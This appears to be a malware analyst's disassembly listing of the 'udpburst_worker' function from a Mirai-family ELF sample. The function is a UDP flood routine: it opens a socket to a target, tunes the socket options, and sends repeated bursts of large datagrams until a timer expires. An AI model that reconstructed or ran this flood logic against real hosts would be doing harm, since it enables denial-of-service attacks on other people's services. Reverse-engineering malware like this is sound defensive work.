
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

00000000004014b0 <udpburst_worker>:
  4014b0: 41 55                        	push	r13
  4014b2: 48 89 fe                     	mov	rsi, rdi
  4014b5: 41 54                        	push	r12
  4014b7: 55                           	push	rbp
  4014b8: 53                           	push	rbx
  4014b9: 48 89 fb                     	mov	rbx, rdi
  4014bc: 48 83 ec 28                  	sub	rsp, 0x28
  4014c0: 48 8d 54 24 04               	lea	rdx, [rsp + 0x4]
  4014c5: 48 c7 04 24 00 00 00 00      	mov	qword ptr [rsp], 0x0
  4014cd: 48 c7 44 24 08 00 00 00 00   	mov	qword ptr [rsp + 0x8], 0x0
  4014d6: 8b 47 40                     	mov	eax, dword ptr [rdi + 0x40]
  4014d9: bf 02 00 00 00               	mov	edi, 0x2
  4014de: 66 c7 04 24 02 00            	mov	word ptr [rsp], 0x2
  4014e4: 66 c1 c8 08                  	ror	ax, 0x8
  4014e8: 66 89 44 24 02               	mov	word ptr [rsp + 0x2], ax
  4014ed: 49 89 e4                     	mov	r12, rsp
  4014f0: e8 ba 8c 00 00               	call	0x40a1af <inet_pton>
  4014f5: 31 d2                        	xor	edx, edx
  4014f7: be 02 00 00 00               	mov	esi, 0x2
  4014fc: bf 02 00 00 00               	mov	edi, 0x2
  401501: e8 6e 93 00 00               	call	0x40a874 <socket>
  401506: 85 c0                        	test	eax, eax
  401508: 89 c5                        	mov	ebp, eax
  40150a: 79 07                        	jns	0x401513 <udpburst_worker+0x63>
  40150c: 31 ff                        	xor	edi, edi
  40150e: e8 9c 15 00 00               	call	0x402aaf <pthread_exit>
  401513: 48 8d 4c 24 1c               	lea	rcx, [rsp + 0x1c]
  401518: 41 b8 04 00 00 00            	mov	r8d, 0x4
  40151e: ba 06 00 00 00               	mov	edx, 0x6
  401523: be 01 00 00 00               	mov	esi, 0x1
  401528: 89 c7                        	mov	edi, eax
  40152a: c7 44 24 1c 01 00 00 00      	mov	dword ptr [rsp + 0x1c], 0x1
  401532: e8 05 93 00 00               	call	0x40a83c <setsockopt>
  401537: 48 8d 4c 24 18               	lea	rcx, [rsp + 0x18]
  40153c: 41 b8 04 00 00 00            	mov	r8d, 0x4
  401542: ba 07 00 00 00               	mov	edx, 0x7
  401547: be 01 00 00 00               	mov	esi, 0x1
  40154c: 89 ef                        	mov	edi, ebp
  40154e: c7 44 24 18 9c ff 63 00      	mov	dword ptr [rsp + 0x18], 0x63ff9c
  401556: e8 e1 92 00 00               	call	0x40a83c <setsockopt>
  40155b: 31 d2                        	xor	edx, edx
  40155d: be 03 00 00 00               	mov	esi, 0x3
  401562: 89 ef                        	mov	edi, ebp
  401564: 31 c0                        	xor	eax, eax
  401566: e8 65 3d 00 00               	call	0x4052d0 <fcntl>
  40156b: 80 cc 08                     	or	ah, 0x8
  40156e: be 04 00 00 00               	mov	esi, 0x4
  401573: 89 ef                        	mov	edi, ebp
  401575: 89 c2                        	mov	edx, eax
  401577: 31 c0                        	xor	eax, eax
  401579: e8 52 3d 00 00               	call	0x4052d0 <fcntl>
  40157e: 31 ff                        	xor	edi, edi
  401580: e8 4b 63 00 00               	call	0x4078d0 <time>
  401585: 48 63 53 44                  	movsxd	rdx, dword ptr [rbx + 0x44]
  401589: 4c 8d 2c 10                  	lea	r13, [rax + rdx]
  40158d: 31 ff                        	xor	edi, edi
  40158f: e8 3c 63 00 00               	call	0x4078d0 <time>
  401594: 49 39 c5                     	cmp	r13, rax
  401597: 7e 32                        	jle	0x4015cb <udpburst_worker+0x11b>
  401599: 31 db                        	xor	ebx, ebx
  40159b: 66 66 90                     	nop
  40159e: 66 90                        	nop
  4015a0: 41 b9 10 00 00 00            	mov	r9d, 0x10
  4015a6: 4d 89 e0                     	mov	r8, r12
  4015a9: b9 40 00 00 00               	mov	ecx, 0x40
  4015ae: ba c0 05 00 00               	mov	edx, 0x5c0
  4015b3: be 40 05 52 00               	mov	esi, 0x520540
  4015b8: 89 ef                        	mov	edi, ebp
  4015ba: ff c3                        	inc	ebx
  4015bc: e8 d7 35 00 00               	call	0x404b98 <sendto>
  4015c1: 81 fb f4 01 00 00            	cmp	ebx, 0x1f4
  4015c7: 75 d7                        	jne	0x4015a0 <udpburst_worker+0xf0>
  4015c9: eb c2                        	jmp	0x40158d <udpburst_worker+0xdd>
  4015cb: 89 ef                        	mov	edi, ebp
  4015cd: 66 66 90                     	nop
  4015d0: e8 69 3d 00 00               	call	0x40533e <close>
  4015d5: e9 32 ff ff ff               	jmp	0x40150c <udpburst_worker+0x5c>
  4015da: 66 66 90                     	nop
  4015dd: 66 66 90                     	nop
